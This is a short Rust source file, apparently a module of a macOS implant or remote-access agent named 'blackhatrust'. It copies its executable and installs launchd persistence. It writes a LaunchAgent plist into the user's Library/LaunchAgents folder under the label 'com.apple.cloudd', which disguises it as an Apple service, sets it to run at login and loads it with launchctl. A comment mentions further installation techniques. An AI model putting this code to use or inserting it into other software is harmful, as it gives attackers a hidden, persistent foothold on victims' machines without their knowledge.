use std::{fs, path::PathBuf, process::Command};

pub const LAUNCHD_FILE: &str = "com.blackhatrust.agent.plist";

pub fn install() -> Result<(), crate::Error> {
    let executable_path = super::copy_executable()?;

    println!("trying launchd persistence");
    if let Ok(_) = install_launchd(&executable_path) {
        println!("success");
        return Ok(());
    }
    println!("failed");

    // other installation techniques

    Ok(())
}

fn install_launchd(executable: &PathBuf) -> Result<(), crate::Error> {
    let launchd_file_content = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://web.archive.org/web/20160508000732/http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.apple.cloudd</string>
            <key>ProgramArguments</key>
            <array>
                <string>{}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
    </plist>"#,
        executable.display()
    );

    let mut launchd_file = match dirs::home_dir() {
        Some(home_dir) => home_dir,
        None => return Err(crate::Error::Internal("Error getting home directory.".to_string())),
    };
    launchd_file.push("Library");
    launchd_file.push("LaunchAgents");
    launchd_file.push(LAUNCHD_FILE);

    fs::write(&launchd_file, launchd_file_content)?;

    Command::new("launchctl")
        .arg("load")
        .arg(launchd_file.display().to_string())
        .output()?;

    Ok(())
}
